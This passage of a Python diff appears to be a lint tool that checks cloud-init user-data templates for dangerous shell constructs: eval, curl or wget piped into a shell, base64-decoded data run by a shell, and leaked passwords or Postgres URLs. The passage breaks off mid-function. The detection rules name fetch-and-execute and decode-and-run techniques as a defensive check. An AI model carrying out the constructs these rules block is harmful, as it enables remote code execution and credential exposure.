+def dq_subs(inner: str) -> list:
+    """Command substitutions inside double-quoted (or unquoted-heredoc) text."""
+    subs, i, n = [], 0, len(inner)
+    while i < n:
+        c = inner[i]
+        if c == "\\":
+            i += 2
+            continue
+        if c == "$" and inner[i + 1:i + 2] == "(":
+            j = find_close(inner, i + 2)
+            if j < 0:
+                return subs + [None]
+            body = inner[i + 2:j]
+            if not (body.startswith("(") and body.endswith(")")):
+                subs.append(body)
+            i = j + 1
+            continue
+        if c == "`":
+            j = bq_end(inner, i + 1)
+            if j < 0:
+                return subs + [None]
+            subs.append(inner[i + 1:j])
+            i = j + 1
+            continue
+        i += 1
+    return subs
+
+
+OPS2 = ("&&", "||", "|&", ";;", ";&")
+
+
+def tokenize(s: str):
+    """Split a bash statement into commands. Returns (commands, subs, ansi) or
+    None when the text cannot be parsed. A command is (words, pipe_in, term)."""
+    cmds, words, subs = [], [], []
+    st = {"word": "", "inword": False, "pipe": False}
+    ansi = False
+
+    def flush():
+        if st["inword"]:
+            words.append(st["word"])
+        st["word"], st["inword"] = "", False
+
+    def end_cmd(op):
+        flush()
+        cmds.append((list(words), st["pipe"], op))
+        del words[:]
+        st["pipe"] = op in ("|", "|&")
+
+    def add(txt):
+        st["word"] += txt
+        st["inword"] = True
+
+    i, n = 0, len(s)
+    while i < n:
+        c = s[i]
+        if c in " \t":
+            flush()
+            i += 1
+            continue
+        if c == "\n":
+            end_cmd("\n")
+            i += 1
+            continue
+        if c == "#" and not st["inword"]:
+            j = s.find("\n", i)
+            i = n if j < 0 else j
+            continue
+        if c == "\\":
+            if s[i + 1:i + 2] == "\n":
+                i += 2
+                continue
+            add(s[i:i + 2])
+            i += 2
+            continue
+        if c == "'":
+            j = s.find("'", i + 1)
+            if j < 0:
+                return None
+            add(s[i:j + 1])
+            i = j + 1
+            continue
+        if c == '"':
+            j = dq_end(s, i + 1)
+            if j < 0:
+                return None
+            got = dq_subs(s[i + 1:j])
+            if None in got:
+                return None
+            subs.extend(got)
+            add(s[i:j + 1])
+            i = j + 1
+            continue
+        if c == "$":
+            nx = s[i + 1:i + 2]
+            if nx in ("'", '"'):
+                ansi = True
+                add("$")
+                i += 1
+                continue
+            if nx == "(":
+                j = find_close(s, i + 2)
+                if j < 0:
+                    return None
+                body = s[i + 2:j]
+                if not (body.startswith("(") and body.endswith(")")):
+                    subs.append(body)
+                add(s[i:j + 1])
+                i = j + 1
+                continue
+            if nx == "{":
+                j = brace_end(s, i + 2)
+                if j < 0:
+                    return None
+                got = dq_subs(s[i + 2:j])
+                if None in got:
+                    return None
+                subs.extend(got)
+                add(s[i:j + 1])
+                i = j + 1
+                continue
+            add("$")
+            i += 1
+            continue
+        if c == "`":
+            j = bq_end(s, i + 1)
+            if j < 0:
+                return None
+            subs.append(s[i + 1:j])
+            add(s[i:j + 1])
+            i = j + 1
+            continue
+        if c in "<>" and s[i + 1:i + 2] == "(":
+            j = find_close(s, i + 2)
+            if j < 0:
+                return None
+            subs.append(s[i + 2:j])
+            add(s[i:j + 1])
+            i = j + 1
+            continue
+        if c == "&" and (s[i + 1:i + 2] == ">" or (st["inword"] and st["word"][-1:] in "<>")):
+            add(c)
+            i += 1
+            continue
+        if c == "|" and st["inword"] and st["word"][-1:] == ">":
+            add(c)
+            i += 1
+            continue
+        if c in ";&|()":
+            op = s[i:i + 2] if s[i:i + 2] in OPS2 else c
+            end_cmd(op)
+            i += len(op)
+            continue
+        add(c)
+        i += 1
+    end_cmd("")
+    return cmds, subs, ansi
+
+
+def unquote(w: str):
+    """Return (value, expanded) for one shell word."""
+    out, exp, i, n = [], False, 0, len(w)
+    while i < n:
+        c = w[i]
+        if c == "\\":
+            out.append(w[i + 1:i + 2])
+            i += 2
+            continue
+        if c == "'":
+            j = w.find("'", i + 1)
+            if j < 0:
+                out.append(w[i + 1:])
+                break
+            out.append(w[i + 1:j])
+            i = j + 1
+            continue
+        if c == '"':
+            j = dq_end(w, i + 1)
+            if j < 0:
+                j = n
+            inner = w[i + 1:j]
+            if "$" in inner or "`" in inner:
+                exp = True
+            out.append(re.sub(r'\\([$`"\\])', r"\1", inner))
+            i = j + 1
+            continue
+        if c in "$`":
+            exp = True
+        out.append(c)
+        i += 1
+    return "".join(out), exp
+
+
+ASSIGN_RE = re.compile(r"^[A-Za-z_]\w*(?:\[[^]]*\])?\+?=")
+REDIR_RE = re.compile(r"^(?:\d*|&)(?:<<<|<<-|<<|<>|>>|>\||>&|<&|&>>|&>|<|>)(.*)$", re.S)
+KEYWORDS = {"if", "then", "do", "else", "elif", "while", "until", "!", "time", "{", "}", "fi", "done", "esac", "coproc"}
+SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "mksh", "busybox"}
+INTERP_BASE_RE = re.compile(r"^(?:python[\d.]*|perl|ruby|node|nodejs|php|lua|tclsh|awk|gawk|mawk)$")
+INTERP_SCRIPT_OPT = {"perl": ("-e", "-E"), "ruby": ("-e",), "node": ("-e", "--eval", "-p", "--print"), "nodejs": ("-e", "--eval", "-p"), "php": ("-r",), "lua": ("-e",)}
+# (options that take an argument, positionals before the command)
+WRAPPERS = {
+    "sudo": ({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T", "--user", "--group", "--chdir", "--host", "--prompt", "--role", "--type", "--other-user", "--close-from", "--command-timeout"}, 0),
+    "env": ({"-u", "--unset", "-C", "--chdir"}, 0),
+    "exec": ({"-a"}, 0),
+    "command": (set(), 0),
+    "builtin": (set(), 0),
+    "nohup": (set(), 0),
+    "setsid": (set(), 0),
+    "stdbuf": ({"-i", "-o", "-e", "--input", "--output", "--error"}, 0),
+    "nice": ({"-n", "--adjustment"}, 0),
+    "ionice": ({"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"}, 0),
+    "timeout": ({"-s", "-k", "--signal", "--kill-after"}, 1),
+    "runuser": ({"-u", "-g", "-G", "-s", "-w", "--user", "--group", "--supp-group", "--shell", "--whitelist-environment"}, 0),
+    "su": ({"-s", "-g", "-G", "-w", "--shell", "--group", "--supp-group", "--whitelist-environment"}, 0),
+    "xargs": ({"-I", "-n", "-P", "-d", "-L", "-s", "-E", "-a", "--arg-file", "--delimiter", "--max-args", "--max-procs", "--max-lines", "--max-chars", "--eof"}, 0),
+    "chroot": ({"--userspec", "--groups"}, 1),
+    "flock": ({"-w", "-E", "--timeout", "--conflict-exit-code"}, 1),
+    "systemd-run": ({"-u", "--unit", "-p", "--property", "--description", "--slice", "-E", "--setenv", "--uid", "--gid", "-M", "--machine", "-H", "--host", "--working-directory", "--on-active", "--on-boot", "--on-calendar", "--timer-property", "--path-property", "--socket-property", "--service-type", "--nice"}, 0),
+}
+SCRIPT_OPTS = {"su": ("-c", "--command"), "runuser": ("-c", "--command"), "flock": ("-c", "--command"), "env": ("-S", "--split-string")}
+
+
+def skip_prefix(words: list, i: int) -> int:
+    """Skip keywords, assignments and redirections before a command word."""
+    while i < len(words):
+        w = words[i]
+        if w in KEYWORDS or ASSIGN_RE.match(w):
+            i += 1
+            continue
+        rm = REDIR_RE.match(w)
+        if rm is not None and not w.startswith("<(") and not w.startswith(">("):
+            i += 1 if rm.group(1) else 2
+            continue
+        break
+    return i
+
+
+def resolve(words: list):
+    """Return (index of the command word or None, [(script, expanded)]) after
+    skipping wrappers; a -c string given to su/runuser/flock is the command."""
+    scripts = []
+    i = skip_prefix(words, 0)
+    for _ in range(12):
+        if i >= len(words):
+            return None, scripts
+        val, exp = unquote(words[i])
+        base = posixpath.basename(val)
+        if exp or base not in WRAPPERS:
+            return i, scripts
+        opts, npos = WRAPPERS[base]
+        rest = words[i + 1:]
+        if base in ("su", "runuser", "flock"):
+            for k, w in enumerate(rest):
+                key = w.split("=", 1)[0]
+                if key in SCRIPT_OPTS[base]:
+                    sv = w.split("=", 1)[1] if "=" in w else (rest[k + 1] if k + 1 < len(rest) else "")
+                    scripts.append(unquote(sv))
+                    return None, scripts
+            if base in ("su", "runuser") and "--" not in rest:
+                return None, scripts
+        j = i + 1
+        while j < len(words):
+            w = words[j]
+            if w == "--":
+                j += 1
+                break
+            if w.startswith("-") and w != "-":
+                key = w.split("=", 1)[0]
+                if base in SCRIPT_OPTS and key in SCRIPT_OPTS[base]:
+                    sv = w.split("=", 1)[1] if "=" in w else (words[j + 1] if j + 1 < len(words) else "")
+                    scripts.append(unquote(sv))
+                    return None, scripts
+                if key in opts and "=" not in w:
+                    j += 2
+                else:
+                    j += 1
+                continue
+            if base in ("env", "sudo") and ASSIGN_RE.match(w):
+                j += 1
+                continue
+            break
+        if base in ("su", "runuser"):
+            j = i + 1 + rest.index("--") + 1
+        else:
+            j += npos
+        i = skip_prefix(words, j)
+    return None, scripts + [("", True)]
+
+
+def shell_script_word(base: str, args: list):
+    """For a shell or interpreter: (has_script_option, script word or None)."""
+    if base in SHELLS:
+        for k, a in enumerate(args):
+            if a == "--" or not a.startswith("-") or a.startswith("--"):
+                if a.startswith("--") and a != "--":
+                    continue
+                return False, None
+            if "c" in a[1:]:
+                for b in args[k + 1:]:
+                    if not b.startswith("-") or b == "-":
+                        return True, b
+                return True, None
+        return False, None
+    if base.startswith("python"):
+        opts = ("-c",)
+    elif base in ("awk", "gawk", "mawk"):
+        return True, next((a for a in args if not a.startswith("-")), None)
+    else:
+        opts = INTERP_SCRIPT_OPT.get(base, ("-e",))
+    for k, a in enumerate(args):
+        if a in opts:
+            return True, args[k + 1] if k + 1 < len(args) else None
+    return False, None
+
+
+def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
+    """Refusals for one bash statement (see the module docstring)."""
+    if depth > 8:
+        return ["nesting deeper than 8 levels"]
+    t = tokenize(stmt)
+    if t is None:
+        if "$" in stmt or "`" in stmt:
+            return ["unparsable statement holding $ or a backtick"]
+        return []
+    cmds, subs, ansi = t
+    out = []
+    if ansi:
+        out.append("ANSI-C or locale quoting ($' or $\")")
+    runs_shell = False
+    decodes = False
+    for words, pipe_in, term in cmds:
+        if not words:
+            if term in (";;", ";&") and st.get("case", 0) > 0:
+                st["pattern"] = True
+            continue
+        if st.get("pattern"):
+            if term == ")":
+                st["pattern"] = False
+            continue
+        if words[0] == "esac":
+            st["case"] = max(0, st.get("case", 0) - 1)
+            st["pattern"] = False
+            continue
+        idx, scripts = resolve(words)
+        for sv, sexp in scripts:
+            if sexp:
+                out.append("expanded or unresolvable script given to a wrapper (-c/-S)")
+            else:
+                out.extend(companion_hits(sv, {}, depth + 1))
+        if idx is None:
+            if term in (";;", ";&") and st.get("case", 0) > 0:
+                st["pattern"] = True
+            continue
+        cw = words[idx]
+        val, exp = unquote(cw)
+        if exp or "$" in cw or "`" in cw:
+            out.append("command word %r is an expansion or command substitution" % cw[:40])
+            continue
+        base = posixpath.basename(val)
+        args = words[idx + 1:]
+        if base == "case":
+            st["case"] = st.get("case", 0) + 1
+            st["pattern"] = True
+            continue
+        if term in (";;", ";&") and st.get("case", 0) > 0:
+            st["pattern"] = True
+        if base == "eval":
+            out.append("eval")
+        if base in ("source", ".") and args and re.match(r"^[\"']?[<$]\(", args[0]):
+            out.append("source of a substitution")
+        is_shell = base in SHELLS
+        if is_shell or INTERP_BASE_RE.match(base):
+            if is_shell:
+                runs_shell = True
+            has_c, sw = shell_script_word(base, args)
+            if has_c:
+                if sw is None:
+                    out.append("%s script option without a script" % base)
+                else:
+                    sval, sexp = unquote(sw)
+                    if sexp:
+                        out.append("expanded %s -c script %r" % (base, sw[:40]))
+                    elif is_shell:
+                        out.extend(companion_hits(sval, {}, depth + 1))
+            elif pipe_in:
+                out.append("pipe into %s (stdin is the program)" % base)
+            for k, a in enumerate(args):
+                if re.match(r"^\d*<<", a) or re.match(r"^\d*<\(", a) or (a == "<" and k + 1 < len(args) and args[k + 1].startswith("<(")):
+                    out.append("%s fed by a here-string, heredoc or process substitution" % base)
+                    break
+        if base == "base64" and any(a in ("-d", "--decode", "-D") or re.match(r"^-[A-Za-z]*d", a) for a in args):
+            decodes = True
+        if base == "xxd" and any(a.startswith("-r") for a in args):
+            decodes = True
+        if base == "openssl" and "-d" in args:
+            decodes = True
+    for sub in subs:
+        out.extend(companion_hits(sub, {}, depth + 1))
+    if decodes and runs_shell:
+        out.append("decoded data in a statement that runs a shell")
+    return out
+
+
+def flow_list(text: str):
+    """Parse a YAML flow list ``[a, "b", 'c']``; None when it cannot."""
+    s = text.strip()
+    if not (s.startswith("[") and s.endswith("]")):
+        return None
+    s = s[1:-1]
+    items, cur, i, n = [], "", 0, len(s)
+    while i < n:
+        c = s[i]
+        if c == '"':
+            j = i + 1
+            while j < n and s[j] != '"':
+                j += 2 if s[j] == "\\" else 1
+            if j >= n:
+                return None
+            cur += s[i:j + 1]
+            i = j + 1
+            continue
+        if c == "'":
+            j = i + 1
+            while j < n:
+                if s[j] == "'" and s[j + 1:j + 2] == "'":
+                    j += 2
+                    continue
+                if s[j] == "'":
+                    break
+                j += 1
+            if j >= n:
+                return None
+            cur += s[i:j + 1]
+            i = j + 1
+            continue
+        if c in "[]{}":
+            return None
+        if c == ",":
+            items.append(cur.strip())
+            cur = ""
+            i += 1
+            continue
+        cur += c
+        i += 1
+    if cur.strip():
+        items.append(cur.strip())
+    out = []
+    for it in items:
+        if it.startswith('"'):
+            try:
+                out.append(json.loads(it))
+            except ValueError:
+                return None
+        elif it.startswith("'"):
+            out.append(it[1:-1].replace("''", "'"))
+        else:
+            out.append(it)
+    return out
+
+
+def yaml_scalar(text: str):
+    s = text.strip()
+    if s.startswith('"'):
+        try:
+            return json.loads(s)
+        except ValueError:
+            return None
+    if s.startswith("'"):
+        if not s.endswith("'") or len(s) < 2:
+            return None
+        return s[1:-1].replace("''", "'")
+    return s
+
+
+# ---------------------------------------------------------------- line model
+class Line:
+    """One logical line of a template."""
+
+    __slots__ = ("ctx", "kind", "raw", "first", "last", "exempt", "block")
+
+    def __init__(self, ctx, kind, raw, first, last, exempt=False, block=None):
+        self.ctx = ctx
+        self.kind = kind  # struct, unit, script, data, heredoc, shebang
+        self.raw = raw  # physical lines joined with newlines
+        self.first = first
+        self.last = last
+        self.exempt = exempt
+        self.block = block
+
+    @property
+    def text(self) -> str:
+        return norm(self.raw)
+
+    @property
+    def joined(self) -> str:
+        return re.sub(r"\\[ \t]*\n", "", self.raw)
+
+
+def decode_views(text: str):
+    v = text
+    for _ in range(5):
+        u = urllib.parse.unquote(v)
+        if u == v:
+            break
+        v = u
+    v1 = v.lower()
+    v2 = re.sub(r"[\"'\\]", "", v1)
+    return v1, v2
+
+
+def triggered(line: Line) -> bool:
+    if line.exempt:
+        return False
+    if line.kind in ("struct", "unit", "shebang"):
+        return True
+    v1, v2 = decode_views(line.joined)
+    return bool(TRIGGER_RE.search(v1) or TRIGGER_RE.search(v2))
+
+
+def parse_template(name: str, text: str):
+    """Return (lines, hits, entries, statements). ``entries`` maps a write_files
+    path to its keys; ``statements`` lists (where, text, state) for the
+    companion rule."""
+    text = DIRECTIVE_LINE_RE.sub("", text)
+    phys = text.split("\n")
+    if phys and phys[-1] == "":
+        phys.pop()
+    lines, hits, entries, stmts = [], [], {}, []
+    top, cur_path, sq = None, None, None
+    item_ind = None
+    i, n = 0, len(phys)
+    block_no = 0
+    while i < n:
+        raw = phys[i]
+        if not raw.strip():
+            i += 1
+            continue
+        if raw[:len(raw) - len(raw.lstrip())].find("\t") >= 0:
+            hits.append("%s:%d: tab in YAML indentation" % (name, i + 1))
+        ind = len(raw) - len(raw.lstrip())
+        s = raw.strip()
+        if sq is not None:
+            lines[-1].raw += "\n" + raw
+            lines[-1].last = i + 1
+            sq = scan_quotes(s, sq)
+            if top in ("bootcmd", "runcmd"):
+                hits.append("%s:%d: a %s item spans lines (one line per item)" % (name, i + 1, top))
+            i += 1
+            continue
+        if s.startswith("#"):
+            ctx = "top" if top is None or ind == 0 else (cur_path if top == "write_files" and cur_path else top)
+            lines.append(Line(ctx, "struct", raw, i + 1, i + 1, exempt=True))
+            i += 1
+            continue
+        if ind == 0:
+            m = re.match(r"^([A-Za-z_][\w-]*):(.*)$", s)
+            if m is None:
+                hits.append("%s:%d: top-level line is not a 'key:' (%r)" % (name, i + 1, s[:40]))
+                top = "?"
+            else:
+                top = m.group(1)
+                if top in ("bootcmd", "runcmd") and m.group(2).strip():
+                    hits.append("%s:%d: %s must be a block list" % (name, i + 1, top))
+            cur_path, item_ind = None, None
+            lines.append(Line("top", "struct", raw, i + 1, i + 1))
+            sq = scan_quotes(s, None)
+            i += 1
+            continue
+        if top == "write_files":
+            if s.startswith("- ") or s == "-":
+                pm = re.match(r"^- path:[ \t]*(\S+)$", s)
+                if pm is None:
+                    hits.append("%s:%d: write_files entry must start with '- path: <path>'" % (name, i + 1))
+                    cur_path = "?"
+                else:
+                    cur_path = pm.group(1)
+                    if cur_path in entries:
+                        hits.append("%s:%d: write_files path %s written twice" % (name, i + 1, cur_path))
+                    entries[cur_path] = {}
+                lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
+                i += 1
+                continue
+            if cur_path is None:
+                hits.append("%s:%d: write_files key outside an entry" % (name, i + 1))
+                cur_path = "?"
+            km = re.match(r"^([A-Za-z_]\w*):(.*)$", s)
+            if km is not None and cur_path in entries:
+                entries[cur_path][km.group(1)] = km.group(2).strip()
+            lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
+            sq = scan_quotes(s, None)
+            if km is not None and km.group(1) == "content":
+                if km.group(2).strip() not in ("|", "|-", "|+"):
+                    hits.append("%s:%d: write_files content must be a literal block (content: |), got %r" % (name, i + 1, km.group(2).strip()[:20]))
+                    i += 1
+                    continue
+                j = i + 1
+                while j < n and (not phys[j].strip() or len(phys[j]) - len(phys[j].lstrip()) > ind):
+                    j += 1
+                while j > i + 1 and not phys[j - 1].strip():
+                    j -= 1
+                block_no += 1
+                parse_block(name, cur_path, phys, i + 1, j, lines, hits, stmts, block_no)
+                i = j
+                continue
+            i += 1
+            continue
+        ctx = top or "top"
+        if top in ("bootcmd", "runcmd"):
+            if item_ind is None:
+                item_ind = ind
+            if ind != item_ind or not s.startswith("- "):
+                hits.append("%s:%d: %s line is not a one-line '- ' item" % (name, i + 1, top))
+            else:
+                val = s[2:].strip()
+                if val[:1] in ("|", ">"):
+                    hits.append("%s:%d: %s item is a block scalar (one line per item)" % (name, i + 1, top))
+                elif val.startswith("["):
+                    items = flow_list(val)
+                    if items is None:
+                        hits.append("%s:%d: %s flow list cannot be parsed" % (name, i + 1, top))
+                    else:
+                        stmts.append(("%s:%d" % (name, i + 1), " ".join(shlex.quote(x) for x in items), {}))
+                else:
+                    sv = yaml_scalar(val)
+                    if sv is None:
+                        hits.append("%s:%d: %s item cannot be parsed" % (name, i + 1, top))
+                    else:
+                        stmts.append(("%s:%d" % (name, i + 1), sv, {}))
+        lines.append(Line(ctx, "struct", raw, i + 1, i + 1))
+        sq = scan_quotes(s, None)
+        i += 1
+    if sq is not None:
+        hits.append("%s: a YAML quote is never closed" % name)
+    return lines, hits, entries, stmts
+
+
+def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
+    """Model the literal block phys[a:b] written to ``path``."""
+    body = phys[a:b]
+    first = next((x for x in body if x.strip()), None)
+    if first is None:
+        return
+    bi = len(first) - len(first.lstrip())
+    ded = []
+    for k, x in enumerate(body):
+        if x.strip() and len(x) - len(x.lstrip()) < bi:
+            hits.append("%s:%d: block line indented less than its first line" % (name, a + k + 1))
+        ded.append(x[bi:] if x.strip() else "")
+    is_unit = "/systemd/" in path or path.endswith(UNIT_SUFFIXES) or any(x.strip() in ("[Unit]", "[Service]", "[Install]") for x in ded)
+    if ded[0].startswith("#!"):
+        kind = "script"
+    elif is_unit:
+        kind = "unit"
+    else:
+        kind = "data"
+    k = 0
+    if kind == "script":
+        lines.append(Line(path, "shebang", ded[0], a + 1, a + 1, block=block_no))
+        k = 1
+    qs = None
+    heredocs = []  # pending (delim, strip_tabs, quoted)
+    stmt_buf, stmt_first = [], None
+    st = {}
+    m = len(ded)
+    while k < m:
+        x = ded[k]
+        if not x.strip():
+            k += 1
+            continue
+        if kind == "unit":
+            grp = [x]
+            exempt = x.lstrip()[:1] in ("#", ";")
+            while not exempt and grp[-1].rstrip().endswith("\\") and k + 1 < m:
+                k += 1
+                grp.append(ded[k])
+            lines.append(Line(path, "unit", "\n".join(grp), a + k - len(grp) + 2, a + k + 1, exempt=exempt, block=block_no))
+            k += 1
+            continue
+        if heredocs:
+            delim, strip_tabs, quoted = heredocs[0]
+            chk = x.lstrip("\t") if strip_tabs else x
+            lines.append(Line(path, "heredoc", x, a + k + 1, a + k + 1, block=block_no))
+            if chk == delim:
+                heredocs.pop(0)
+            elif not quoted:
+                for sub in dq_subs(x):
+                    if sub is None:
+                        hits.append("%s:%d: unparsable substitution in a heredoc body" % (name, a + k + 1))
+                    else:
+                        stmts.append(("%s:%d" % (name, a + k + 1), sub, {}))
+            k += 1
+            continue
+        if kind == "data":
+            lines.append(Line(path, "data", x, a + k + 1, a + k + 1, block=block_no))
+            stmts.append(("%s:%d" % (name, a + k + 1), x, st))
+            k += 1
+            continue
+        start = k
+        is_comment = x.lstrip().startswith("#") and qs is None
+        grp = [x]
+        if not is_comment:
+            while grp[-1].rstrip().endswith("\\") and k + 1 < m:
+                k += 1
+                grp.append(ded[k])
+        ln = Line(path, "script", "\n".join(grp), a + start + 1, a + k + 1, exempt=is_comment, block=block_no)
+        lines.append(ln)
+        k += 1
+        if is_comment:
+            continue
+        joined = ln.joined
+        for hd in heredoc_starts(joined, qs):
+            if hd == "bad":
+                hits.append("%s:%d: heredoc operator whose delimiter cannot be read" % (name, ln.first))
+            else:
+                heredocs.append(hd)
+        qs = scan_quotes(joined, qs)
+        if stmt_first is None:
+            stmt_first = ln.first
+        stmt_buf.append(joined)
+        if qs is None:
+            stmts.append(("%s:%d" % (name, stmt_first), "\n".join(stmt_buf), st))
+            stmt_buf, stmt_first = [], None
+    if heredocs:
+        hits.append("%s: heredoc %s in %s is never terminated" % (name, heredocs[0][0], path))
+    if qs is not None or stmt_buf:
+        hits.append("%s: a quote opened in %s is never closed" % (name, path))
+
+
+# ---------------------------------------------------------------- validators
+def service_homes(lines: list) -> set:
+    homes = set()
+    for ln in lines:
+        if not re.search(r"(?<![\w-])useradd(?![\w-])", ln.joined):
+            continue
+        seg = re.split(r"\|\||&&|;|\|", ln.joined[ln.joined.find("useradd"):])[0]
+        try:
+            toks = shlex.split(seg)
+        except ValueError:
+            toks = seg.split()
+        home, user, k = None, None, 1
+        while k < len(toks):
+            tk = toks[k]
+            if tk in ("-d", "--home-dir", "--home"):
+                home = toks[k + 1] if k + 1 < len(toks) else None
+                k += 2
+                continue
+            if tk.startswith("--home-dir=") or tk.startswith("--home="):
+                home = tk.split("=", 1)[1]
+            elif tk in ("-s", "--shell", "-g", "-G", "-u", "-c", "-k", "-e", "-f", "-K", "-p", "-b", "-Z", "--gid", "--groups", "--uid", "--comment", "--skel", "--base-dir"):
+                k += 2
+                continue
+            elif not tk.startswith("-"):
+                user = tk
+            k += 1
+        if home:
+            homes.add(home.rstrip("/"))
+        elif user:
+            homes.add("/home/" + user)
+    return homes
+
+
+def dsn_problems(dsn: str, ctx: str) -> list:
+    out = []
+    try:
+        parts = urllib.parse.urlsplit(dsn)
+    except ValueError:
+        return ["postgres URL %s cannot be parsed" % redact(dsn)]
+    raw_modes = re.findall(r"(?:^|[?&])sslmode=([^&#]*)", "?" + parts.query if parts.query else "")
+    if not raw_modes or raw_modes[-1] != "verify-full":
+        out.append("postgres URL %s: the last raw sslmode is not exactly sslmode=verify-full (#3705 floor)" % redact(dsn))
+    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
+    modes = [v for k, v in pairs if k == "sslmode"]
+    if not modes:
+        out.append("postgres URL %s has no sslmode key as sqlx reads it" % redact(dsn))
+    elif modes[-1] != "verify-full":
+        out.append("postgres URL %s: sqlx reads sslmode=%s (the last one, percent-decoded)" % (redact(dsn), modes[-1][:20]))
+    for k, _ in pairs:
+        if k.lower() == "sslmode" and k != "sslmode":
+            out.append("postgres URL %s has a case-variant sslmode key %r (sqlx keys are case-sensitive)" % (redact(dsn), k))
+        if k.lower() in ("password", "passfile"):
+            out.append("postgres URL %s carries a %s key" % (redact(dsn), k.lower()))
+    netloc = parts.netloc
+    if "@" in netloc and ":" in netloc.rsplit("@", 1)[0] and ctx != STORE_URL_PATH:
+        out.append("postgres URL with a userinfo password outside %s" % STORE_URL_PATH)
+    return out
+
+
+def redact(dsn: str) -> str:
+    return re.sub(r"//[^@/]*@", "//<userinfo>@", dsn)[:70]
+
+
+def validate_line(ln: Line, homes: set, binaries: set) -> list:
+    j = ln.joined
+    v1, v2 = decode_views(j)
+    out = []
+    for m in DSN_RE.finditer(j):
+        out.extend(dsn_problems(m.group(0), ln.ctx))
+    if "allow_lax" in v1:
+        out.append("lax store-url permission opt-out")
+    if re.search(r"pgpassword|pgpassfile", v1):
+        out.append("PGPASSWORD/PGPASSFILE")
+    if re.search(r"ai_memory_store_url\s*=", v1):
+        out.append("AI_MEMORY_STORE_URL= (use AI_MEMORY_STORE_URL_FILE, #4577)")
+    if re.search(r"(?<![\w-])--store(?!\w)", v2):
+        out.append("a --store flag fragment (the store URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577/#4693)")
+    for b in sorted(binaries):
+        if re.search(r"(?:>|(?<![\w-])tee\s+(?:-\S+\s+)*)\s*[\"']?" + re.escape(b) + r"(?![\w.-])", j):
+            out.append("a redirect or tee writes the unit binary %s (only install may place it)" % b)
+    if re.search(r"--store[-_]url", v2) or re.search(r"--store[-_]url", re.sub(r"\s+", "", v2)):
+        out.append("--store-url (the URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577)")
+    if re.search(r"(?<![\w-])password\s+'", v1):
+        out.append("SQL PASSWORD literal (the role password lands on a psql argv and in the script)")
+    if re.search(r"\$\{[^}]*(?:password|secret|token|passwd)[^}]*\}", v1):
+        out.append("a terraform secret interpolated into user-data (readable from the instance metadata service)")
+    if re.search(r"(?<![\w-])password\s*=", v2):
+        out.append("password= (a credential in a world-readable line or on an argv)")
+    if re.search(r"(?<![\w-])(?:curl|wget)(?![\w-])", v1):
+        if re.search(r"\|\|\s*true\b", v1):
+            out.append("curl/wget failure ignored with || true")
+        if re.search(r"(?<!\|)\|(?!\|)&?\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?(?:sh|bash|dash|zsh|ksh|tar|python[\d.]*|perl|ruby|node|source|\.)(?![\w-])", v1):
+            out.append("curl/wget piped into a shell, tar or interpreter")
+    if re.search(r"(?<![\w-])tar(?![\w-])", v1) and re.search(r"(?<![\w-])(?:-[a-z]*x[a-z]*|x[a-z]*f|--extract|--get)(?![\w-])", v1) and re.search(r"\|\|\s*true\b", v1):
+        out.append("tar extract failure ignored with || true")
+    em = re.match(r"^\s*exec\w*=\s*([-@+!:]*)(\S+)", v1)
+    if em is not None and ln.kind == "unit":
+        binary = em.group(2)
+        for h in homes:
+            if binary.startswith(h.lower() + "/"):
+                out.append("unit runs %s from inside the service home %s (the service user can substitute it)" % (binary, h))
+    if ln.kind == "struct":
+        if re.match(r"^\s*-?\s*(?:encoding|source|uri)\s*:", v1) or "!!binary" in v1:
+            out.append("write_files encoding:/source:/uri:/!!binary hides the written bytes")
+        pm = re.match(r"^\s*permissions\s*:\s*(.*)$", j)
+        if pm is not None and ln.ctx == STORE_URL_PATH and pm.group(1).strip() != "'0600'":
+            out.append("%s permissions must be '0600'" % STORE_URL_PATH)
+    if "store-url" in v1:
+        for cm in re.finditer(r"(?<![\w-])chmod\s+((?:-\S+\s+)*)(\S+)", v1):
+            if cm.group(2) not in ("600", "0600"):
+                out.append("chmod of the store-url file to %s (must stay 0600)" % cm.group(2))
+    return out
+
+
+# ---------------------------------------------------------------- user-data
+def render_size_view(text: str) -> str:
+    t = text.replace("$${", "\x00").replace("%%{", "\x01")
+    t = re.sub(r"%\{[^}]*\}", "", t)
+
+    def stand_in(m):
+        nm = m.group(1).lower()
+        return "x" * (256 if "url" in nm else 64)
+
+    t = re.sub(r"\$\{\s*([^}]*)\}", stand_in, t)
+    return t.replace("\x00", "${").replace("\x01", "%{")
+
+
+def userdata_hits(name: str, scope: str, text: str, maintf) -> list:
+    if scope not in USER_DATA_LIMITS:
+        return ["FAULT:%s: no user-data limit known for scope %r" % (name, scope)]
+    limit = USER_DATA_LIMITS[scope]
+    rendered = render_size_view(text).encode("utf-8")
+    if len(rendered) <= limit:
+        return []
+    tpl = posixpath.basename(name)
+    want = re.compile(r"user_data_base64\s*=\s*base64gzip\(templatefile\(\"\$\{path\.module\}/" + re.escape(tpl) + "\"")
+    if maintf is None or not want.search(maintf):
+        return ["%s: rendered user-data is %d bytes, over the %d-byte limit of %s, and main.tf does not pass it through user_data_base64 = base64gzip(...) (#4703)" % (name, len(rendered), limit, scope)]
+    gz = len(gzip.compress(rendered, mtime=0))
+    if gz > limit:
+        return ["%s: gzip of the rendered user-data is %d bytes, over the %d-byte limit (#4703)" % (name, gz, limit)]
+    return []
+
+
+# ---------------------------------------------------------------- allowlist
+def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
+    """Parse allowlist text into (scope, issue, ctx, line, file_lineno)."""
+    out = []
+    for no, raw in enumerate(text.splitlines(), 1):
+        if not raw.strip() or raw.startswith("#"):
+            continue
+        parts = raw.split(" | ", 2)
+        if len(parts) != 3 or not parts[1].strip() or not parts[2].strip():
+            faults.append("%s:%d: malformed entry (want '<scope> | <context> | <line>')" % (label, no))
+            continue
+        head, ctx, line = parts[0], parts[1], parts[2]
+        issue = None
+        if pending:
+            hm = re.match(r"^(\S+) (#\d+)$", head)
+            if hm is None:
